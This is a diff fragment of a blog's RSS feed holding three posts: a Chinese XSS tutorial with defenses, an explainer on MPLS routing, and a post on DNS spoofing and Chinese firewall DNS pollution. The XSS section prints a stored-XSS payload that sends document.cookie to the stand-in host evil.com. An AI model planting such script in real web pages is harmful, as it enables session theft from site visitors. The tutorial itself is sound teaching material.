+&lt;p&gt;&lt;strong&gt;防御措施&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;对用户输入进行严格的&lt;strong&gt;输入验证&lt;/strong&gt;和&lt;strong&gt;输出编码&lt;/strong&gt;（例如，将 &lt;code&gt;&amp;lt;&lt;/code&gt; 编码为 &lt;code&gt;&amp;amp;lt;&lt;/code&gt;）&lt;/li&gt;
+&lt;li&gt;使用安全的框架（如 React 或 Angular），它们通常会自动对输出进行转义&lt;/li&gt;
+&lt;li&gt;启用 Content Security Policy (CSP)，限制页面加载的脚本来源&lt;/li&gt;
+&lt;li&gt;对 URL 参数进行过滤，拒绝包含可疑字符的请求&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;12-存储型-xss-stored-xss&#34;&gt;1.2. 存储型 XSS (Stored XSS)&lt;/h3&gt;
+&lt;p&gt;存储型 XSS 是一种持久性跨站脚本攻击, 攻击者将恶意脚本注入到目标网站的数据库或其他存储介质中, 当其他用户访问受感染的页面时, 服务器会从存储中取出恶意脚本并将其嵌入到页面, 脚本会在用户的浏览器中执行:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;攻击者通过网站的输入点（如评论区、用户资料、帖子等）提交包含恶意脚本的内容&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;服务器未对输入进行充分过滤，将恶意脚本保存到数据库&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;当其他用户访问相关页面时，服务器从数据库中取出数据（包含恶意脚本），并将其嵌入到页面中&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;用户的浏览器加载页面时，执行恶意脚本&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;假设有一个论坛网站, 用户可以在帖子中发表评论, 如果服务器没有对评论内容进行过滤, 攻击者可以在评论中输入恶意脚本, 例如, 攻击者在评论框中输入:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;You are hacked!&amp;#39;);&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这条评论被保存到数据库中, 每当其他用户访问这个帖子时, 服务器会从数据库中取出评论内容并直接渲染到页面, 生成如下 HTML:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;comment&amp;#34;&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;alert&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;You are hacked!&amp;#39;&lt;/span&gt;);&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;所有访问该帖子的用户都会在浏览器中看到 You are hacked! 的弹窗, 攻击者可能利用存储型 XSS 进行更严重的攻击, 例如窃取用户会话或执行钓鱼攻击, 假设攻击者在评论中输入:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;script&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;XMLHttpRequest&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;open&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://evil.com/steal?cookie=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;cookie&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;xhr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;send&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/script&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这条评论被存储后, 任何访问该页面的用户的 Cookie 都会被发送到攻击者的服务器 evil.com, 如果网站使用 Cookie 进行身份验证, 攻击者可能窃取用户的会话, 冒充用户进行操作,&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;防御措施&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;使用 HTTPOnly 和 Secure Cookie 标志, 降低 Cookie 窃取的风险&lt;/li&gt;
+&lt;li&gt;启用 Content Security Policy (CSP), 限制脚本执行&lt;/li&gt;
+&lt;li&gt;对用户输入进行严格的&lt;strong&gt;输入验证&lt;/strong&gt;, 只允许安全的字符和格式&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>MPLS</title>
+      <link>https://blog.jiyi27.com/posts/networking/008-mpls/</link>
+      <pubDate>Fri, 17 Nov 2023 08:27:59 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/008-mpls/</guid>
+      <description>&lt;h2 id=&#34;1-ospf-bgp-and-mpls&#34;&gt;1. OSPF, BGP and MPLS&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;OSPF: OSPF is an interior gateway protocol (IGP) used for routing within an autonomous system (AS). It determines the best paths for routing packets based on metrics such as bandwidth, delay, and cost.&lt;/li&gt;
+&lt;li&gt;﻿﻿BGP: BGP is an exterior gateway protocol (EGP) used for routing between autonomous systems. It enables the exchange of routing information between different networks and determines the best paths between ASes.&lt;/li&gt;
+&lt;li&gt;﻿﻿MPLS: MPLS is not a routing protocol but a forwarding mechanism that operates at the network layer. It uses labels to encapsulate packets, creating virtual paths called Label Switched Paths (LSPs). MPLS allows for efficient forwarding and traffic engineering by quickly switching packets based on labels instead of performing complex IP routing.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Routers&lt;/strong&gt; refer to internal &lt;strong&gt;routing tables&lt;/strong&gt; to make decisions about how to route packets along network paths. A routing table records the paths that packets should take to reach every destination that the router is responsible for.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-ospf-bgp-and-mpls&#34;&gt;1. OSPF, BGP and MPLS&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;OSPF: OSPF is an interior gateway protocol (IGP) used for routing within an autonomous system (AS). It determines the best paths for routing packets based on metrics such as bandwidth, delay, and cost.&lt;/li&gt;
+&lt;li&gt;﻿﻿BGP: BGP is an exterior gateway protocol (EGP) used for routing between autonomous systems. It enables the exchange of routing information between different networks and determines the best paths between ASes.&lt;/li&gt;
+&lt;li&gt;﻿﻿MPLS: MPLS is not a routing protocol but a forwarding mechanism that operates at the network layer. It uses labels to encapsulate packets, creating virtual paths called Label Switched Paths (LSPs). MPLS allows for efficient forwarding and traffic engineering by quickly switching packets based on labels instead of performing complex IP routing.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Routers&lt;/strong&gt; refer to internal &lt;strong&gt;routing tables&lt;/strong&gt; to make decisions about how to route packets along network paths. A routing table records the paths that packets should take to reach every destination that the router is responsible for.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;2-mpls&#34;&gt;2. MPLS&lt;/h2&gt;
+&lt;h3 id=&#34;21-basic-concepts&#34;&gt;2.1. Basic concepts&lt;/h3&gt;
+&lt;p&gt;In a network that uses MPLS, each packet is assigned to a class called a forwarding equivalence class (FEC). The network paths that packets can take are called label-switched paths (LSP). A packet&amp;rsquo;s class (FEC) determines which path (LSP) the packet will be assigned to. Packets with the same FEC follow the same LSP.&lt;/p&gt;
+&lt;p&gt;Each packet has one or more &lt;strong&gt;labels&lt;/strong&gt; attached, and all labels are contained in an &lt;strong&gt;MPLS header&lt;/strong&gt;, which is added on top of all the other headers attached to a packet. &lt;strong&gt;FECs&lt;/strong&gt; are listed within each packet&amp;rsquo;s labels. Routers do not examine the packet&amp;rsquo;s other headers; they can essentially ignore the IP header. Instead, they examine the packet&amp;rsquo;s label and direct the packet to the right &lt;strong&gt;LSP&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Because MPLS-supporting routers only need to see the MPLS labels attached to a given packet, MPLS can work with almost any protocol (hence the name &amp;ldquo;multiprotocol&amp;rdquo;). It does not matter how the rest of the packet is formatted, as long as the router can read the MPLS labels at the front of the packet.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/01/b32f8d45f569a19f8f8284634b7968d2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Label value: the name says it all, this is where you will find the value of the label.&lt;/li&gt;
+&lt;li&gt;EXP: these are the three experimental bits. These are used for QoS, normally the IP precedence value of the IP packet will be copied here.&lt;/li&gt;
+&lt;li&gt;S: this is the “bottom of stack” bit. With MPLS it’s possible to add more than one label, you’ll see why in some of the MPLS VPN lessons. When this bit is set to one, it’s the last MPLS header. When it’s set to zero then there is one or more MPLS headers left.&lt;/li&gt;
+&lt;li&gt;TTL: just like in the IP header, this is the time to live field. You can use this for traces in the MPLS network. Each hop decrements the TTL by one.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;22-fecs&#34;&gt;2.2. FECs&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;FEC is a term used in MPLS networks to describe a set of incoming packets with similar characteristics, allowing those packets to be allocated the same label and forwarded down the same LSP (Label Switched Path). &lt;a href=&#34;https://www.mpirical.com/glossary/fec-forwarding-equivalence-class.&#34;&gt;FEC - Forwarding Equivalence Class&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;In previous part we said: &lt;strong&gt;FECs&lt;/strong&gt; are listed within each packet&amp;rsquo;s labels. But, wait, how?&lt;/p&gt;
+&lt;p&gt;An FEC is a set of packets that a single router:&lt;/p&gt;
+&lt;p&gt;(1) Forwards to the same next hop;&lt;/p&gt;
+&lt;p&gt;(2) Out the same interface; and&lt;/p&gt;
+&lt;p&gt;(3) With the same treatment (such as queuing).&lt;/p&gt;
+&lt;h3 id=&#34;23-step-by-step-a-packet-in-mpls-network&#34;&gt;2.3. Step-by-Step a packet in MPLS network&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;Packet Enters the MPLS Network:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Imagine a data packet entering an MPLS network at an &amp;lsquo;ingress router&amp;rsquo;.&lt;/li&gt;
+&lt;li&gt;The ingress router examines the header of the packet (like destination IP address).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Label Assignment:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Based on this examination, the router assigns a &amp;rsquo;label&amp;rsquo; to the packet. This label is a short, fixed-length identifier.&lt;/li&gt;
+&lt;li&gt;The process of assigning a label is known as &amp;rsquo;label imposition&#39;.&lt;/li&gt;
+&lt;li&gt;Each label corresponds to a pre-determined path through the network, known as a Label Switched Path (LSP).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Packet Travels through the MPLS Network:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;Once the packet has been labeled, it is sent into the MPLS network.&lt;/li&gt;
+&lt;li&gt;As it reaches each router (or label switch router, LSR) in the MPLS network, the router does not need to examine the IP header. Instead, it looks at the label.&lt;/li&gt;
+&lt;li&gt;Based on the label, the LSR quickly determines where to send the packet next. This is a process called &amp;rsquo;label switching&#39;.&lt;/li&gt;
+&lt;li&gt;The LSR may also swap the packet&amp;rsquo;s existing label with a new label before forwarding it (label swapping). This is done to maintain the correct routing path as defined by the LSP.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Approaching the Exit of the MPLS Network:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;As the packet approaches the end of its path through the MPLS network, it reaches an &amp;rsquo;egress router&#39;.&lt;/li&gt;
+&lt;li&gt;The egress router removes the MPLS label from the packet, a process known as &amp;rsquo;label popping&#39;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Packet Leaves the MPLS Network:&lt;/strong&gt;
+&lt;ul&gt;
+&lt;li&gt;After the label is removed, the packet is forwarded based on its original IP header.&lt;/li&gt;
+&lt;li&gt;It is now back in a standard IP-based network and can be routed to its final destination using traditional IP routing methods.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;3-ospf-bgp-and-mpls&#34;&gt;3. OSPF, BGP and MPLS&lt;/h2&gt;
+&lt;p&gt;So each packet has a LSP theoretically? which means each packet belongs to a FEC, and each FEC has a LSP, the LSP built by using the routing table formed by OSPF and BGP&lt;/p&gt;
+&lt;p&gt;Yes, your understanding is on the right track. In MPLS (Multiprotocol Label Switching) networks, the concept of Forwarding Equivalence Classes (FECs) and Label Switched Paths (LSPs) is fundamental. Let&amp;rsquo;s break down these concepts:&lt;/p&gt;
+&lt;h3 id=&#34;31-forwarding-equivalence-class-fec&#34;&gt;3.1. Forwarding Equivalence Class (FEC)&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;A FEC is essentially a group of IP packets that are forwarded in the same manner (same path, same treatment).&lt;/li&gt;
+&lt;li&gt;Each packet that enters an MPLS network is assigned to a FEC.&lt;/li&gt;
+&lt;li&gt;The assignment is based on criteria like destination IP address, IP protocol type, source IP address, and even Layer 4 ports.&lt;/li&gt;
+&lt;li&gt;The idea is that all packets within a FEC will follow the same LSP and receive similar forwarding treatment.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Label Switched Path (LSP)&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;An LSP is a pre-established path that packets in a particular FEC will follow through the MPLS network.&lt;/li&gt;
+&lt;li&gt;LSPs are set up by the MPLS control plane, which can use signaling protocols like RSVP-TE or LDP.&lt;/li&gt;
+&lt;li&gt;Once an LSP is established, labels are assigned and used to forward the packets along this path.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;32-interaction-with-ospf-and-bgp&#34;&gt;3.2. Interaction with OSPF and BGP&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;OSPF and BGP are used to form the routing table, which provides the necessary information about network topology and available paths.&lt;/li&gt;
+&lt;li&gt;OSPF is typically used within an autonomous system (internal routing), while BGP is used between autonomous systems (external routing).&lt;/li&gt;
+&lt;li&gt;The information from OSPF and BGP helps in determining the best paths for the LSPs.&lt;/li&gt;
+&lt;li&gt;Once the best paths are identified, MPLS signaling protocols set up LSPs along these paths, and labels are distributed to the routers (LSRs) on these paths.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;33-practical-example&#34;&gt;3.3. Practical Example&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Imagine a packet entering an MPLS network destined for a specific IP address.&lt;/li&gt;
+&lt;li&gt;This packet is assigned to a FEC based on its destination IP.&lt;/li&gt;
+&lt;li&gt;An LSP for this FEC has already been established using OSPF or BGP routing information.&lt;/li&gt;
+&lt;li&gt;The ingress router assigns an MPLS label to the packet based on its FEC.&lt;/li&gt;
+&lt;li&gt;The packet is then forwarded through the MPLS network, with each router making forwarding decisions based solely on the MPLS label.&lt;/li&gt;
+&lt;li&gt;When the packet reaches the egress router of the MPLS network, the MPLS label is removed, and the packet is forwarded based on its original IP header.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In this way, each packet is associated with a FEC, and each FEC has its LSP. The LSPs are constructed using the routing tables formed by OSPF and BGP, ensuring that packets are forwarded efficiently and along optimal paths within the MPLS network.&lt;/p&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/network-layer/what-is-mpls/&#34;&gt;What is MPLS (multiprotocol label switching)? | Cloudflare&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://networklessons.com/mpls/mpls-labels-and-devices&#34;&gt;MPLS Labels and Devices&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.networkworld.com/article/2350449/understanding-the-role-of-fecs-in-mpls.html&#34;&gt;Understanding the Role of FECs in MPLS | Network World&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>DNS Spoofing - GFW</title>
+      <link>https://blog.jiyi27.com/posts/networking/005-gfw-dns/</link>
+      <pubDate>Tue, 31 Oct 2023 15:29:25 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/005-gfw-dns/</guid>
+      <description>&lt;p&gt;声明: 本文只用于学习目的, 请勿用于非法用途.&lt;/p&gt;
+&lt;h2 id=&#34;1-dns-spoofing&#34;&gt;1. DNS spoofing&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/dns/what-is-dns/&#34;&gt;DNS&lt;/a&gt; cache poisoning is the act of entering false information into a DNS cache, so that DNS queries return an incorrect response and users are directed to the wrong websites. DNS cache poisoning is also known as &amp;lsquo;DNS spoofing&amp;rsquo;.&lt;/p&gt;
+&lt;h3 id=&#34;11-dns-caching&#34;&gt;1.1. DNS Caching&lt;/h3&gt;
+&lt;p&gt;Learn more about DNS caching: &lt;a href=&#34;https://davidzhu.xyz/post/networking/002-dns-basics/&#34;&gt;DNS Concepts (NameServer(NS), DNS Records and Caching) - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;12-how-do-attackers-poison-dns-caches&#34;&gt;1.2. How do attackers poison DNS caches?&lt;/h3&gt;
+&lt;p&gt;Attackers can poison DNS caches by impersonating &lt;a href=&#34;https://www.cloudflare.com/learning/dns/dns-server-types/&#34;&gt;DNS nameservers&lt;/a&gt;, making a request to a DNS resolver, and then forging the reply when the DNS resolver queries a nameserver. This is possible because DNS servers use &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/user-datagram-protocol-udp/&#34;&gt;UDP&lt;/a&gt; instead of &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/tcp-ip/&#34;&gt;TCP&lt;/a&gt;, and because currently there is no verification for DNS information.&lt;/p&gt;</description>
+      <content>&lt;p&gt;声明: 本文只用于学习目的, 请勿用于非法用途.&lt;/p&gt;
+&lt;h2 id=&#34;1-dns-spoofing&#34;&gt;1. DNS spoofing&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cloudflare.com/learning/dns/what-is-dns/&#34;&gt;DNS&lt;/a&gt; cache poisoning is the act of entering false information into a DNS cache, so that DNS queries return an incorrect response and users are directed to the wrong websites. DNS cache poisoning is also known as &amp;lsquo;DNS spoofing&amp;rsquo;.&lt;/p&gt;
+&lt;h3 id=&#34;11-dns-caching&#34;&gt;1.1. DNS Caching&lt;/h3&gt;
+&lt;p&gt;Learn more about DNS caching: &lt;a href=&#34;https://davidzhu.xyz/post/networking/002-dns-basics/&#34;&gt;DNS Concepts (NameServer(NS), DNS Records and Caching) - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;12-how-do-attackers-poison-dns-caches&#34;&gt;1.2. How do attackers poison DNS caches?&lt;/h3&gt;
+&lt;p&gt;Attackers can poison DNS caches by impersonating &lt;a href=&#34;https://www.cloudflare.com/learning/dns/dns-server-types/&#34;&gt;DNS nameservers&lt;/a&gt;, making a request to a DNS resolver, and then forging the reply when the DNS resolver queries a nameserver. This is possible because DNS servers use &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/user-datagram-protocol-udp/&#34;&gt;UDP&lt;/a&gt; instead of &lt;a href=&#34;https://www.cloudflare.com/learning/ddos/glossary/tcp-ip/&#34;&gt;TCP&lt;/a&gt;, and because currently there is no verification for DNS information.&lt;/p&gt;
+&lt;p&gt;DNS Cache Poisoning Process:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/01/9bac53ae4cf010ddec6d34a15ca5bf7a.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Poisoned DNS Cache:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-2a6758f3b2d64ef5bb71ba1601101d35.r2.dev/blogs/2025/01/5160e98a37841a2eac514a21f56224c9.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;If a DNS resolver receives a forged response, it accepts and caches the data uncritically because there is no way to verify if the information is accurate and comes from a legitimate source.&lt;/p&gt;
+&lt;p&gt;Despite these major points of vulnerability in the DNS caching process, DNS poisoning attacks are not easy. Because the DNS resolver does actually query the authoritative nameserver, attackers have only a few milliseconds to send the fake reply before the real reply from the authoritative nameserver arrives.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;The way to prevent this is to set the /etc/host file directly, because checking host file happens before DNS resolution.&lt;/p&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://davidzhu.xyz/post/networking/002-host-file-dns-stub-resolver/&#34;&gt;DNS Stub and Recursive Resolver - Config Files - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://www.cloudflare.com/learning/dns/dns-cache-poisoning/&#34;&gt;What is DNS cache poisoning? | DNS spoofing | Cloudflare&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-gfw&#34;&gt;2. GFW&lt;/h2&gt;
+&lt;h3 id=&#34;21-http-劫持&#34;&gt;2.1. HTTP 劫持&lt;/h3&gt;
+&lt;p&gt;原文: &lt;a href=&#34;https://doubibackup.com/6t3mypbm-5.html#comments&#34;&gt;浅谈HTTP劫持、DNS污染的影响及解决办法（仅个人理解） | 逗比根据地&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;HTTP劫持很容易理解，因为HTTP传输协议是明文的，并且我的网站服务器是在海外，要访问我的网站就要通过中国的国际宽带出口，出去与我的网站建立连接。我的网站也是因为关键词的原因在经过出口的时候，被“&lt;strong&gt;检查站：墙&lt;/strong&gt;”扫描到了违规关键词，于是掐断了TCP链接。所以当时用户访问网站会遇到：&lt;strong&gt;链接已重置、该网站已永久移动到其他地址等等。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;HTTP劫持很容易解决，那就是&lt;strong&gt;加上SSL证书，网站链接全部内容加密&lt;/strong&gt;，这样“检查站：墙”就无法解密数据分析关键词了。但是这不是绝对能解决这个问题的，如果你的网站只是误杀或者违规擦边球，那还好，如果是大型网站，就会特殊对待了。&lt;/p&gt;
+&lt;p&gt;HTTPS在建立加密连接的时候，需要一次握手，也就是达成链接协议建立加密连接，但是这次握手是明文的（建立加密链接首先就是链接双方信任，比如网站的SSL证书是自己签的，或者SSL证书到期或伪造的，在访问这个网站的时候浏览器就会进行提示，表示此网站不安全啥的。）握手是明文的就意味着，如果你的域名被重点关注，即使你加上了SSL证书，也会在首次握手的时候，被关键词匹配然后掐断链接。 learn more: &lt;a href=&#34;https://davidzhu.xyz/post/http/006-https-ssl/&#34;&gt;HTTPS SSL TLS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;22-dns污染投毒&#34;&gt;2.2. DNS污染投毒&lt;/h3&gt;
+&lt;p&gt;我们假设A为用户端也就是你的电脑设备，B为DNS服务器，C为A到B链路中一个节点的网络设备（路由器、交换机、网关等）。&lt;/p&gt;
+&lt;p&gt;然后我们模拟一次被污染的DNS请求过程。&lt;/p&gt;
+&lt;p&gt;A访问一个网站，比如 &lt;code&gt;google.com&lt;/code&gt; ，然后，A向B通过UDP方式发送查询请求，比如查询内容 &lt;code&gt;A google.com&lt;/code&gt; ，这个数据库在前往B的时候要经过数个节点网络设备比如C，然后继续前往DNS服务器B。&lt;/p&gt;
+&lt;p&gt;然而在这个传输过程中，C针对这个数据包进行特征分析，（DNS端口为53，进行特定端口监视扫描，对UDP明文传输的DNS查询请求进行特征和关键词匹配分析，比如“google.com”是关键词，也或者是“A记录”），从而立刻返回一个错误的解析结果（比如返回了 &lt;code&gt;A 233.233.233.233&lt;/code&gt; ）。&lt;/p&gt;
+&lt;p&gt;众所周知，作为链路上的一个节点，网络设备 C 必定比真正的 DNS 服务器 B 更快的返回结果到 用户电脑A，而目前的DNS解析机制策略有一个重要的原则，就是只认第一。因此 节点网络设备C所返回的查询结果就被 用户电脑A当作了最终结果，于是用户电脑A因为获得了错误的IP，导致无法正常访问 &lt;code&gt;google.com &lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;验证污染 我的 doub.ssrshare.usm 主域名虽然在大部分地区解除了DNS污染，但是我的两个SS站域名并没有，所以我尝试对我的SS 子域名进行nslookup测试。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;C:&lt;span style=&#34;color:#ae81ff&#34;&gt;\U&lt;/span&gt;sers&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrator&amp;gt;nslookup ss.dou-bi.com 8.8.8.8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;服务器: google-public-dns-a.google.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Address: 8.8.8.8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;非权威应答:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;名称: ss.dou-bi.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Addresses: 200:2:9f6a:794b::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;8.7.198.45
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我使用的是谷歌的 8.8.8.8 DNS，但是我得到的A记录 IP却是8.7.198.45，这个明显不是我的IP，看一下其他被DNS污染的域名就会发现都会有这个IP。很明显，我的 ss.dou-bi.com 域名受到了DNS污染。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;解决办法&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
